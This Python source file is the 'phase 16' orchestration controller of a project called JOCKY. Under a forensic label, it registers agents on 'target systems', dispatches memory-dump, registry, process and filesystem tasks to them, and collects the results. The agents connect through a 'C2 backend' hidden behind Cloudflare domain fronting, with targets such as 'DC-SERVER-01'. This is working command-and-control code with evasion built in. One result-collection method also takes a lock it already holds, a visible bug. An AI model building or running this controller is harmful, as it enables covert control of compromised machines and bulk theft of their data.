# management_interface/agent_controller.py
# [JOCKY phase 16 -- multi-agent orchestration controller]
#
# PURPOSE
# -------
# Manages simultaneous connections to multiple JOCKY agents deployed
# on target systems. Each agent runs independently — the controller
# coordinates tasking, collects results, and maintains session state.
#
# ARCHITECTURE
# ------------
#
#   InvestigatorSession (CLI / Dashboard)
#           |
#           v
#   AgentController  (this file)
#       |    |    |
#       v    v    v
#   Agent  Agent  Agent  ...  (unlimited, asyncio-managed)
#     |      |      |
#   transport.cdn_router.JockyTransport  (phase 14)
#
# Each Agent runs in its own asyncio task.
# The controller exposes a simple command API:
#   task(agent_id, cmd_type, args)  -- dispatch a forensic command
#   results(agent_id)               -- retrieve collected evidence
#   status()                        -- health snapshot of all agents
#   broadcast(cmd_type, args)       -- send same task to ALL agents
#
# THREAD MODEL
# ------------
# asyncio event loop runs in a dedicated background thread.
# All public methods are thread-safe (use run_coroutine_threadsafe).
# The dashboard (phase 17) calls these methods from its own thread.
#
# *one investigator. every machine. simultaneously.
#  the controller breathes and each agent exhales evidence.*

from __future__ import annotations
import sys as _sys, pathlib as _pl
_ROOT = _pl.Path(__file__).resolve().parent.parent
if str(_ROOT) not in _sys.path:
    _sys.path.insert(0, str(_ROOT))

import asyncio
import json
import logging
import threading
import time
import uuid
from collections import deque
from dataclasses  import dataclass, field
from enum         import Enum, auto
from typing       import Any, Deque, Dict, List, Optional, Tuple

log = logging.getLogger("jocky.controller")


# ── Agent state machine ───────────────────────────────────────────────────────

class AgentState(Enum):
    PENDING     = auto()   # registered, not yet connected
    CONNECTED   = auto()   # checked in at least once
    TASKED      = auto()   # command dispatched, awaiting result
    COLLECTING  = auto()   # actively receiving evidence stream
    IDLE        = auto()   # connected, no active task
    LOST        = auto()   # missed N consecutive check-ins
    TERMINATED  = auto()   # graceful shutdown or eviction

    def __str__(self) -> str:
        return self.name


# ── Task descriptor ───────────────────────────────────────────────────────────

class TaskStatus(Enum):
    PENDING   = auto()
    SENT      = auto()
    COMPLETE  = auto()
    FAILED    = auto()
    TIMEOUT   = auto()

@dataclass
class AgentTask:
    task_id:    str
    agent_id:   str
    cmd_type:   str           # e.g. "mem_acquire", "proc_list", "reg_walk"
    args:       Dict[str, Any]
    created_at: float = field(default_factory=time.time)
    sent_at:    Optional[float] = None
    completed_at: Optional[float] = None
    status:     TaskStatus = TaskStatus.PENDING
    result:     Optional[Dict[str, Any]] = None
    error:      Optional[str] = None

    @property
    def elapsed(self) -> Optional[float]:
        if self.completed_at and self.sent_at:
            return self.completed_at - self.sent_at
        return None


# ── Per-agent session ─────────────────────────────────────────────────────────

@dataclass
class AgentSession:
    """
    Runtime state for a single deployed JOCKY agent.
    One AgentSession per target machine.
    """
    agent_id:    str
    label:       str                         # human name e.g. "TARGET-DC01"
    psk:         bytes                       # 32-byte pre-shared key
    c2_backend:  str
    cdn_fronts:  List[str]

    state:       AgentState       = AgentState.PENDING
    last_seen:   float            = 0.0
    checkin_count: int            = 0
    missed_checkins: int          = 0

    task_queue:  Deque[AgentTask] = field(default_factory=deque)
    results:     List[Dict]       = field(default_factory=list)
    active_task: Optional[AgentTask] = None

    _transport: Any = field(default=None, repr=False)   # JockyTransport

    # integrity: chain each session's evidence separately
    chain_path:  Optional[str] = None

    @property
    def is_alive(self) -> bool:
        if self.last_seen == 0.0:
            return False
        return (time.time() - self.last_seen) < 300   # 5 min timeout

    def to_dict(self) -> dict:
        return {
            "agent_id":       self.agent_id,
            "label":          self.label,
            "state":          str(self.state),
            "last_seen":      self.last_seen,
            "checkin_count":  self.checkin_count,
            "missed":         self.missed_checkins,
            "pending_tasks":  len(self.task_queue),
            "results_count":  len(self.results),
            "is_alive":       self.is_alive,
            "active_task":    self.active_task.task_id
                              if self.active_task else None,
        }


# ── Controller ────────────────────────────────────────────────────────────────

class AgentController:
    """
    JOCKY multi-agent orchestration controller.

    Usage:
        ctrl = AgentController()
        ctrl.start()

        # register targets
        ctrl.register_agent("agent-01", b"PSK...", "c2.example.com",
                            label="DC-SERVER-01")
        ctrl.register_agent("agent-02", b"PSK...", "c2.example.com",
                            label="WORKSTATION-FINANCE")

        # dispatch forensic commands
        ctrl.task("agent-01", "proc_list",   {})
        ctrl.task("agent-01", "mem_acquire", {"pid": 1234, "size": 65536})
        ctrl.broadcast("reg_walk",           {"hive": "HKLM\\SOFTWARE"})

        # collect results
        evidence = ctrl.results("agent-01")

        # teardown
        ctrl.stop()
    """

    # check-in polling interval per agent (seconds)
    POLL_INTERVAL     = 30.0
    # consecutive missed check-ins before marking LOST
    LOST_THRESHOLD    = 5
    # max results kept per agent in memory (older entries rotate out)
    MAX_RESULTS       = 500

    def __init__(self):
        self._agents:   Dict[str, AgentSession] = {}
        self._tasks:    Dict[str, AgentTask]    = {}   # task_id -> task
        self._lock      = threading.Lock()

        # asyncio event loop runs in its own background thread
        self._loop:    Optional[asyncio.AbstractEventLoop] = None
        self._thread:  Optional[threading.Thread]          = None
        self._running  = False

        # global result callback (set by dashboard)
        self._on_result = None

    # ── lifecycle ─────────────────────────────────────────────────────────────

    def start(self) -> None:
        """Start the asyncio event loop in a background daemon thread."""
        if self._running:
            return
        self._loop   = asyncio.new_event_loop()
        self._thread = threading.Thread(
            target=self._run_loop,
            daemon=True,
            name="jocky-controller",
        )
        self._running = True
        self._thread.start()
        log.info("[controller] started")

    def _run_loop(self) -> None:
        asyncio.set_event_loop(self._loop)
        self._loop.run_until_complete(self._controller_main())

    def stop(self) -> None:
        """Graceful shutdown: stop all agent transports, cancel all tasks."""
        self._running = False
        if self._loop:
            asyncio.run_coroutine_threadsafe(
                self._shutdown_all(), self._loop
            ).result(timeout=10)
        log.info("[controller] stopped")

    async def _shutdown_all(self) -> None:
        with self._lock:
            sessions = list(self._agents.values())
        for sess in sessions:
            if sess._transport:
                try:
                    sess._transport.close()
                except Exception:
                    pass
            sess.state = AgentState.TERMINATED
        log.info("[controller] all agents terminated")

    # ── agent registration ────────────────────────────────────────────────────

    def register_agent(self,
                       agent_id:   str,
                       psk:        bytes,
                       c2_backend: str,
                       cdn_fronts: Optional[List[str]] = None,
                       label:      Optional[str]       = None,
                       chain_path: Optional[str]       = None) -> None:
        """
        Register a new target agent with the controller.
        Call before start() or after -- controller picks it up on next poll cycle.

        agent_id:   must match the AGENT_ID compiled into the deployed agent
        psk:        32-byte pre-shared key matching the agent's PSK
        c2_backend: C2 domain (Host header for domain fronting)
        cdn_fronts: SNI front domains (defaults to Cloudflare CDN)
        label:      human-readable target label
        chain_path: path for this agent's integrity chain JSON
        """
        from transport.cdn_router import CLOUDFLARE_FRONTS
        sess = AgentSession(
            agent_id   = agent_id,
            label      = label or agent_id,
            psk        = psk,
            c2_backend = c2_backend,
            cdn_fronts = cdn_fronts or CLOUDFLARE_FRONTS,
            chain_path = chain_path,
        )
        with self._lock:
            self._agents[agent_id] = sess

        # schedule the agent's poll loop in the event loop
        if self._loop and self._running:
            asyncio.run_coroutine_threadsafe(
                self._agent_poll_loop(agent_id), self._loop
            )
        log.info(f"[controller] registered agent: {agent_id} ({label})")

    def deregister_agent(self, agent_id: str) -> None:
        """Remove an agent from the controller."""
        with self._lock:
            sess = self._agents.pop(agent_id, None)
        if sess and sess._transport:
            sess._transport.close()
        log.info(f"[controller] deregistered: {agent_id}")

    # ── task dispatch ─────────────────────────────────────────────────────────

    def task(self,
             agent_id: str,
             cmd_type: str,
             args:     Dict[str, Any]) -> str:
        """
        Dispatch a forensic task to a specific agent.
        Returns task_id for tracking.

        cmd_type examples:
            "proc_list"    -- enumerate running processes
            "mem_acquire"  -- dump process memory region
            "reg_walk"     -- walk registry hive
            "net_state"    -- capture network connections
            "fs_analysis"  -- filesystem artifact collection
        """
        with self._lock:
            if agent_id not in self._agents:
                raise KeyError(f"agent not registered: {agent_id}")

        task_id = str(uuid.uuid4())
        t = AgentTask(
            task_id  = task_id,
            agent_id = agent_id,
            cmd_type = cmd_type,
            args     = args,
        )
        with self._lock:
            self._agents[agent_id].task_queue.append(t)
            self._tasks[task_id] = t

        log.info(f"[controller] task queued: {task_id} "
                 f"agent={agent_id} cmd={cmd_type}")
        return task_id

    def broadcast(self,
                  cmd_type: str,
                  args:     Dict[str, Any]) -> List[str]:
        """
        Dispatch the same task to ALL registered agents simultaneously.
        Returns list of task_ids.
        *one investigator command. every target receives it.*
        """
        task_ids = []
        with self._lock:
            agent_ids = list(self._agents.keys())
        for aid in agent_ids:
            try:
                task_ids.append(self.task(aid, cmd_type, args))
            except Exception as e:
                log.warning(f"[controller] broadcast to {aid} failed: {e}")
        log.info(f"[controller] broadcast: cmd={cmd_type} "
                 f"to {len(task_ids)} agents")
        return task_ids

    def get_task(self, task_id: str) -> Optional[AgentTask]:
        with self._lock:
            return self._tasks.get(task_id)

    # ── result collection ─────────────────────────────────────────────────────

    def results(self,
                agent_id:   str,
                since:      float = 0.0,
                cmd_filter: Optional[str] = None) -> List[Dict]:
        """
        Retrieve collected evidence from a specific agent.

        since:      only return results collected after this timestamp
        cmd_filter: filter by command type
        """
        with self._lock:
            sess = self._agents.get(agent_id)
            if not sess:
                return []
            items = list(sess.results)

        if since > 0:
            items = [r for r in items if r.get("collected_at", 0) >= since]
        if cmd_filter:
            items = [r for r in items if r.get("cmd_type") == cmd_filter]
        return items

    def all_results(self) -> Dict[str, List[Dict]]:
        """Return all results from all agents."""
        with self._lock:
            return {aid: list(sess.results)
                    for aid, sess in self._agents.items()}

    def set_result_callback(self, fn) -> None:
        """
        Register a callback invoked whenever any agent submits a result.
        Called from the event loop thread — must be thread-safe.
        fn signature: fn(agent_id: str, result: dict)
        """
        self._on_result = fn

    # ── status ────────────────────────────────────────────────────────────────

    def status(self) -> Dict[str, Any]:
        """
        Return a health snapshot of all agents and pending tasks.
        Called by the dashboard every few seconds.
        """
        with self._lock:
            agents = {aid: sess.to_dict()
                      for aid, sess in self._agents.items()}
            pending = sum(
                1 for t in self._tasks.values()
                if t.status in (TaskStatus.PENDING, TaskStatus.SENT)
            )
        return {
            "timestamp":   time.time(),
            "agent_count": len(agents),
            "agents":      agents,
            "pending_tasks": pending,
            "total_tasks": len(self._tasks),
        }

    def agent_status(self, agent_id: str) -> Optional[Dict]:
        with self._lock:
            sess = self._agents.get(agent_id)
            return sess.to_dict() if sess else None

    # ── asyncio internals ─────────────────────────────────────────────────────

    async def _controller_main(self) -> None:
        """
        Main coroutine: spawn poll loops for already-registered agents,
        then sit in a health-check loop until _running goes False.
        """
        # start poll loops for any agents registered before start()
        with self._lock:
            agent_ids = list(self._agents.keys())
        for aid in agent_ids:
            asyncio.ensure_future(self._agent_poll_loop(aid),
                                  loop=self._loop)

        # controller heartbeat: log status every 60 seconds
        while self._running:
            await asyncio.sleep(60)
            snap = self.status()
            log.info(f"[controller] status: {snap['agent_count']} agents, "
                     f"{snap['pending_tasks']} pending tasks")

    async def _agent_poll_loop(self, agent_id: str) -> None:
        """
        Per-agent poll coroutine.
        Runs independently for each agent — checks in, dispatches pending
        tasks, and handles results. Never exits until agent is terminated.

        *each agent has its own rhythm. the controller does not impose one.*
        """
        from transport.cdn_router import JockyTransport

        with self._lock:
            sess = self._agents.get(agent_id)
        if not sess:
            return

        # initialise transport for this agent
        try:
            transport = JockyTransport(
                agent_id   = sess.agent_id,
                psk        = sess.psk,
                c2_backend = sess.c2_backend,
                fronts     = sess.cdn_fronts,
            )
            with self._lock:
                sess._transport = transport
            log.info(f"[controller] transport ready: {agent_id}")
        except Exception as e:
            log.error(f"[controller] transport init failed for {agent_id}: {e}")
            with self._lock:
                sess.state = AgentState.LOST
            return

        while self._running:
            with self._lock:
                state = sess.state
            if state == AgentState.TERMINATED:
                break

            # ── check-in ──────────────────────────────────────────────────
            try:
                # run blocking JockyTransport.checkin() in thread pool
                # so it doesn't block the event loop
                cmd_payload = await self._loop.run_in_executor(
                    None, transport.checkin
                )

                with self._lock:
                    sess.last_seen    = time.time()
                    sess.checkin_count += 1
                    sess.missed_checkins = 0
                    if sess.state == AgentState.PENDING:
                        sess.state = AgentState.CONNECTED
                    elif sess.state != AgentState.TASKED:
                        sess.state = AgentState.IDLE

                # if C2 delivered a result payload, collect it
                if cmd_payload and "result" in cmd_payload:
                    await self._collect_result(agent_id, cmd_payload)

            except Exception as e:
                log.warning(f"[controller] checkin failed: {agent_id}: {e}")
                with self._lock:
                    sess.missed_checkins += 1
                    if sess.missed_checkins >= self.LOST_THRESHOLD:
                        sess.state = AgentState.LOST
                        log.warning(f"[controller] agent LOST: {agent_id}")

            # ── dispatch pending tasks ─────────────────────────────────────
            await self._dispatch_pending(agent_id, transport)

            # ── sleep before next poll cycle ───────────────────────────────
            try:
                await asyncio.sleep(self.POLL_INTERVAL)
            except asyncio.CancelledError:
                break

        log.info(f"[controller] poll loop exited: {agent_id}")

    async def _dispatch_pending(self,
                                 agent_id:  str,
                                 transport: Any) -> None:
        """Send the next pending task to the agent via transport."""
        with self._lock:
            sess = self._agents.get(agent_id)
            if not sess or not sess.task_queue:
                return
            if sess.active_task:
                # already waiting for a result
                return
            task = sess.task_queue.popleft()
            sess.active_task = task
            sess.state       = AgentState.TASKED

        task.status  = TaskStatus.SENT
        task.sent_at = time.time()

        try:
            ok = await self._loop.run_in_executor(
                None,
                lambda: transport.send_result({
                    "type":    "task",
                    "task_id": task.task_id,
                    "cmd":     task.cmd_type,
                    "args":    task.args,
                })
            )
            if not ok:
                task.status = TaskStatus.FAILED
                task.error  = "send_result returned False"
                with self._lock:
                    sess.active_task = None
                    sess.state = AgentState.IDLE
                log.warning(f"[controller] task send failed: {task.task_id}")
            else:
                log.info(f"[controller] task dispatched: "
                         f"{task.task_id} cmd={task.cmd_type} "
                         f"agent={agent_id}")
        except Exception as e:
            task.status = TaskStatus.FAILED
            task.error  = str(e)
            with self._lock:
                sess.active_task = None
            log.error(f"[controller] dispatch error: {agent_id}: {e}")

    async def _collect_result(self,
                               agent_id: str,
                               payload:  Dict) -> None:
        """Store an incoming result and update task state."""
        result_entry = {
            "agent_id":     agent_id,
            "collected_at": time.time(),
            "cmd_type":     payload.get("cmd"),
            "task_id":      payload.get("task_id"),
            "data":         payload.get("result"),
        }

        with self._lock:
            sess = self._agents.get(agent_id)
            if not sess:
                return
            sess.results.append(result_entry)
            if len(sess.results) > self.MAX_RESULTS:
                sess.results.pop(0)   # rotate oldest out

            # resolve the active task
            if (sess.active_task and
                    sess.active_task.task_id == payload.get("task_id")):
                sess.active_task.status       = TaskStatus.COMPLETE
                sess.active_task.completed_at = time.time()
                sess.active_task.result       = payload.get("result")
                with self._lock:
                    self._tasks[sess.active_task.task_id] = sess.active_task
                sess.active_task = None
                sess.state       = AgentState.IDLE

        log.info(f"[controller] result collected: "
                 f"agent={agent_id} cmd={payload.get('cmd')} "
                 f"bytes={len(str(payload.get('result', '')))}")

        # fire global callback (dashboard live-update hook)
        if self._on_result:
            try:
                self._on_result(agent_id, result_entry)
            except Exception as e:
                log.warning(f"[controller] result callback error: {e}")


# ── standalone smoke test ─────────────────────────────────────────────────────

def _smoke_test() -> None:
    """
    Offline smoke test: no network, no real agents.
    Verifies controller start/stop, agent registration,
    task dispatch to queue, status reporting.
    """
    print("\n[*] AgentController offline smoke test\n")

    ctrl = AgentController()
    ctrl.start()
    time.sleep(0.1)   # let event loop spin up

    # register two fictional targets
    ctrl.register_agent(
        "agent-dc01",
        b"JOCKY_DEMO_PSK_32_BYTES_12345678",
        "c2.example.com",
        label="TARGET-DC01",
    )
    ctrl.register_agent(
        "agent-ws01",
        b"JOCKY_DEMO_PSK_32_BYTES_12345678",
        "c2.example.com",
        label="TARGET-WORKSTATION-01",
    )
    time.sleep(0.1)

    # dispatch tasks
    t1 = ctrl.task("agent-dc01", "proc_list",   {})
    t2 = ctrl.task("agent-dc01", "reg_walk",    {"hive": "HKLM\\SOFTWARE"})
    t3 = ctrl.task("agent-ws01", "net_state",   {})
    bcast = ctrl.broadcast("fs_analysis", {"path": "C:\\Users"})

    snap = ctrl.status()
    assert snap["agent_count"] == 2,   f"expected 2 agents, got {snap['agent_count']}"
    assert snap["pending_tasks"] >= 2, f"expected pending tasks, got {snap['pending_tasks']}"

    print(f"[+] controller started: OK")
    print(f"[+] 2 agents registered: OK")
    print(f"[+] tasks queued: t1={t1[:8]}... t2={t2[:8]}... t3={t3[:8]}...")
    print(f"[+] broadcast dispatched: {len(bcast)} tasks")
    print(f"[+] status snapshot: {snap['agent_count']} agents, "
          f"{snap['pending_tasks']} pending tasks")

    # verify task lookup
    task_obj = ctrl.get_task(t1)
    assert task_obj is not None
    assert task_obj.cmd_type == "proc_list"
    assert task_obj.agent_id == "agent-dc01"
    print(f"[+] task lookup by ID: OK  (cmd={task_obj.cmd_type})")

    # verify per-agent status
    dc01_status = ctrl.agent_status("agent-dc01")
    assert dc01_status["label"] == "TARGET-DC01"
    print(f"[+] per-agent status: OK  (label={dc01_status['label']})")

    # result callback
    collected = []
    ctrl.set_result_callback(lambda aid, r: collected.append((aid, r)))
    print(f"[+] result callback registered: OK")

    ctrl.stop()
    print(f"\n[+] controller stopped cleanly: OK")
    print(f"\n{'='*45}")
    print(f"[+] Phase 16 AgentController: SMOKE TEST PASSED")
    print(f"{'='*45}\n")


if __name__ == "__main__":
    logging.basicConfig(level=logging.WARNING)   # quiet for test
    _smoke_test()